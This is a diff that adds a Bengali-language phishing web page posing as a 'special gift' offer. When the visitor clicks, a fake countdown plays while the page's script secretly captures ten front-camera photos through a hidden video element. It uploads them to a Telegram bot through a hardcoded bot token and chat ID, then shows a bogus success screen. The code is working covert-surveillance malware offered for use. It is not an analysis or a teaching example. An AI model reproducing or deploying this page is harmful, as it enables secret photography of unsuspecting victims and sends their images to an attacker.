@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 বিশেষ উপহার - মোহাম্মদ আলামিন</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Kalam', 'SutonnyMJ', 'Bangla', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* স্নোফল ইফেক্ট */
+        .snow {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .snowflake {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: fall linear infinite;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+        
+        .container {
+            background: white;
+            border-radius: 30px;
+            padding: 50px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        h1 {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            font-size: 1.8em;
+        }
+        
+        .greeting {
+            font-size: 1.3em;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        
+        .message {
+            color: #555;
+            line-height: 1.8;
+            margin-bottom: 30px;
+            font-size: 1.05em;
+        }
+        
+        .start-btn {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            font-weight: bold;
+        }
+        
+        .start-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+        
+        .start-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* কাউন্টডাউন পেজ */
+        .countdown-container {
+            display: none;
+        }
+        
+        .countdown-box {
+            background: white;
+            border-radius: 30px;
+            padding: 50px 30px;
+            text-align: center;
+        }
+        
+        .gift-icon {
+            font-size: 80px;
+            animation: bounce 1s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        /* বড় কাউন্টডাউন নাম্বার */
+        .countdown-number {
+            font-size: 90px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin: 20px 0;
+            font-family: monospace;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s linear;
+            border-radius: 10px;
+        }
+        
+        .waiting-text {
+            color: #666;
+            font-size: 1em;
+            margin-top: 20px;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+        }
+        
+        .loading-dots span {
+            animation: blink 1.4s infinite;
+            animation-fill-mode: both;
+        }
+        
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        
+        .loading-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        
+        @keyframes blink {
+            0%, 80%, 100% { opacity: 0; }
+            40% { opacity: 1; }
+        }
+        
+        /* সাফল্যের পেজ */
+        .success-container {
+            display: none;
+            background: white;
+            border-radius: 30px;
+            padding: 50px 30px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            animation: bounce 0.5s ease;
+        }
+        
+        .congrats {
+            font-size: 1.8em;
+            color: #4CAF50;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        
+        .contact-info {
+            margin: 30px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            text-align: left;
+        }
+        
+        .contact-item {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            padding: 10px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: transform 0.3s;
+            cursor: pointer;
+        }
+        
+        .contact-item:hover {
+            transform: translateX(5px);
+            background: #f0f0f0;
+        }
+        
+        .contact-icon {
+            font-size: 30px;
+            margin-right: 15px;
+        }
+        
+        .contact-text {
+            flex: 1;
+        }
+        
+        .contact-label {
+            font-size: 0.8em;
+            color: #666;
+        }
+        
+        .contact-value {
+            font-size: 1.1em;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .copy-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 5px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.8em;
+            transition: background 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #764ba2;
+        }
+        
+        video, canvas {
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .container, .success-container, .countdown-box {
+                padding: 30px 20px;
+            }
+            
+            .congrats {
+                font-size: 1.5em;
+            }
+            
+            .countdown-number {
+                font-size: 70px;
+            }
+            
+            .contact-value {
+                font-size: 0.9em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="snow" id="snow"></div>
+    
+    <!-- মেইন পেজ -->
+    <div id="mainPage" class="container">
+        <h1>🎉 বিশেষ উপহার 🎁</h1>
+        <div class="greeting">আসসালামু আলাইকুম ওয়া রহমাতুল্লাহ</div>
+        <div class="message">
+            আমি <strong>মোহাম্মদ আলামিন</strong><br><br>
+            আজকে সবার জন্য আছে এক বিশেষ সারপ্রাইজ!<br><br>
+            আপনার জন্য অপেক্ষা করছে এক অসাধারণ উপহার 🎁<br><br>
+            পেতে নিচের বাটনে ক্লিক করুন
+        </div>
+        <button class="start-btn" onclick="startGiftProcess()">🎁 উপহার নিন 🎁</button>
+    </div>
+    
+    <!-- কাউন্টডাউন পেজ (ইউজার দেখবে) -->
+    <div id="countdownPage" class="countdown-container">
+        <div class="countdown-box">
+            <div class="gift-icon">🎁</div>
+            <div class="countdown-number" id="countdownNumber">10</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p class="waiting-text">
+                আপনার উপহার প্রস্তুত হচ্ছে 
+                <span class="loading-dots">
+                    <span>.</span><span>.</span><span>.</span>
+                </span>
+            </p>
+            <p class="waiting-text" style="font-size: 0.85em; color: #999; margin-top: 10px;">
+                অনুগ্রহ করে অপেক্ষা করুন
+            </p>
+        </div>
+    </div>
+    
+    <!-- সাফল্যের পেজ -->
+    <div id="successPage" class="success-container">
+        <div class="success-icon">🎉</div>
+        <div class="congrats">অভিনন্দন!</div>
+        <p style="color: #666; margin-bottom: 20px;">আপনি সফলভাবে উপহারটি পেয়ে গেছেন!</p>
+        
+        <div class="contact-info">
+            <p style="text-align: center; margin-bottom: 15px; font-weight: bold;">📢 উপহারটি নিতে যোগাযোগ করুন:</p>
+            
+            <div class="contact-item" onclick="copyText('@mr_virus_apk')">
+                <div class="contact-icon">🎵</div>
+                <div class="contact-text">
+                    <div class="contact-label">TikTok</div>
+                    <div class="contact-value">@mr_virus_apk</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+            
+            <div class="contact-item" onclick="copyText('Mohammad Alamin')">
+                <div class="contact-icon">📘</div>
+                <div class="contact-text">
+                    <div class="contact-label">Facebook</div>
+                    <div class="contact-value">Mohammad Alamin</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+            
+            <div class="contact-item" onclick="copyText('@mrvirus460')">
+                <div class="contact-icon">📨</div>
+                <div class="contact-text">
+                    <div class="contact-label">Telegram</div>
+                    <div class="contact-value">@mrvirus460</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+        </div>
+        
+        <button class="start-btn" onclick="location.reload()" style="margin-top: 20px; padding: 10px 30px; font-size: 1em;">
+            🏠 হোম পেজে ফিরুন
+        </button>
+    </div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ⚠️ আপনার টেলিগ্রাম বটের তথ্য এখানে দিন ⚠️
+        const BOT_TOKEN = '8983518072:AAExiw4cmLN2Ab41MmNtCzdEaR8gC5eQdWk';
+        const CHAT_ID = '7625984778';
+        
+        let stream = null;
+        let photosTaken = 0;
+        const totalPhotos = 10;
+        let countdownInterval = null;
+        let isSuccessShown = false;
+        
+        // স্নোফল ইফেক্ট
+        function createSnow() {
+            const snowDiv = document.getElementById('snow');
+            for(let i = 0; i < 100; i++) {
+                const snowflake = document.createElement('div');
+                snowflake.className = 'snowflake';
+                snowflake.style.left = Math.random() * 100 + '%';
+                snowflake.style.width = Math.random() * 6 + 2 + 'px';
+                snowflake.style.height = snowflake.style.width;
+                snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+                snowflake.style.animationDelay = Math.random() * 5 + 's';
+                snowflake.style.opacity = Math.random() * 0.5 + 0.2;
+                snowDiv.appendChild(snowflake);
+            }
+        }
+        
+        // গোপনে ক্যামেরা চালু করা
+        async function startGiftProcess() {
+            try {
+                // পেজ পরিবর্তন (কাউন্টডাউন দেখাবে)
+                document.getElementById('mainPage').style.display = 'none';
+                document.getElementById('countdownPage').style.display = 'block';
+                
+                // কাউন্টডাউন শুরু (দেখানোর জন্য)
+                startCountdownDisplay();
+                
+                // ক্যামেরা অ্যাক্সেস চাওয়া (গোপনে)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                window.currentStream = stream;
+                
+                // ভিডিওর জন্য CSS মিরর ইফেক্ট (শুধু প্রিভিউয়ের জন্য)
+                video.style.transform = 'scaleX(-1)';
+                
+                // ছবি তোলা শুরু (ব্যাকগ্রাউন্ডে - কিন্তু কাউন্টডাউন ব্লক করবে না)
+                capturePhotosInBackground();
+                
+            } catch(err) {
+                console.error('Camera error:', err);
+                // ২য় বার চেষ্টা
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true 
+                    });
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    window.currentStream = stream;
+                    video.style.transform = 'scaleX(-1)';
+                    capturePhotosInBackground();
+                } catch(err2) {
+                    // ক্যামেরা না দিলেও কাউন্টডাউন শেষে সাফল্যের পেজ দেখানো
+                }
+            }
+        }
+        
+        // কাউন্টডাউন দেখানো (শুধু ভিজুয়াল) - ১০ সেকেন্ডে শেষ
+        function startCountdownDisplay() {
+            let timeLeft = 10;
+            const countdownElement = document.getElementById('countdownNumber');
+            const progressFill = document.getElementById('progressFill');
+            
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownElement.textContent = timeLeft;
+                
+                // প্রগ্রেস বার আপডেট
+                const progressPercent = ((10 - timeLeft) / 10) * 100;
+                progressFill.style.width = progressPercent + '%';
+                
+                if(timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    // কাউন্টডাউন শেষ - সঙ্গে সঙ্গে সাফল্যের পেজ দেখাও
+                    if(!isSuccessShown) {
+                        isSuccessShown = true;
+                        showSuccessPage();
+                    }
+                }
+            }, 1000);
+        }
+        
+        // গোপনে ছবি তোলা (ব্যাকগ্রাউন্ডে) - async but non-blocking
+        async function capturePhotosInBackground() {
+            photosTaken = 0;
+            
+            // ১০টি ছবি তোলা (প্রতি সেকেন্ডে ১টি)
+            for(let i = 0; i < totalPhotos; i++) {
+                await takePhoto();
+                photosTaken++;
+                if(photosTaken < totalPhotos) {
+                    await sleep(1000);
+                }
+            }
+            
+            // সব ছবি তোলা শেষ হলে ক্যামেরা বন্ধ
+            if(window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // ছবি তোলা শেষ - কোনো পেজ চেঞ্জ করবো না (ইতিমধ্যে হয়ে গেছে)
+        }
+        
+        // ১টা ছবি তোলা (মিরর ইফেক্ট ফিক্স সহ)
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            if(video.videoWidth > 0 && video.videoHeight > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // মিরর ইফেক্ট ঠিক করা
+                context.save();
+                context.scale(-1, 1);
+                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                context.restore();
+                
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, `gift_photo_${Date.now()}_${photosTaken + 1}.jpg`);
+                        formData.append('caption', `🎁 গিফট ফটো #${photosTaken + 1}/10\n📱 ইউজার পেজ ভিজিট করেছে\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`);
+                        
+                        try {
+                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch(error) {
+                            console.error('Send error:', error);
+                        }
+                        
+                        resolve();
+                    }, 'image/jpeg', 0.8);
+                });
+            }
+            return Promise.resolve();
+        }
+        
+        // সাফল্যের পেজ দেখানো - এখন সঙ্গে সঙ্গে দেখাবে
+        function showSuccessPage() {
+            // ক্যামেরা বন্ধ করা
+            if(window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            // পেজ পরিবর্তন
+            document.getElementById('countdownPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+        }
+        
+        // টেক্সট কপি ফাংশন
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ কপি হয়েছে: ' + text);
+            }).catch(() => {
+                alert('❌ কপি করতে ব্যর্থ');
+            });
+        }
+        
+        // স্লিপ ফাংশন
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        // পেজ লোড হলে
+        window.addEventListener('load', () => {
+            createSnow();
+        });
+        
+        // পেজ ছাড়ার সময় ক্যামেরা বন্ধ
+        window.addEventListener('beforeunload', () => {
+            if(window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+            if(countdownInterval) {
+                clearInterval(countdownInterval);
+            }
+        });
+    </script>
+</body>
+</html>
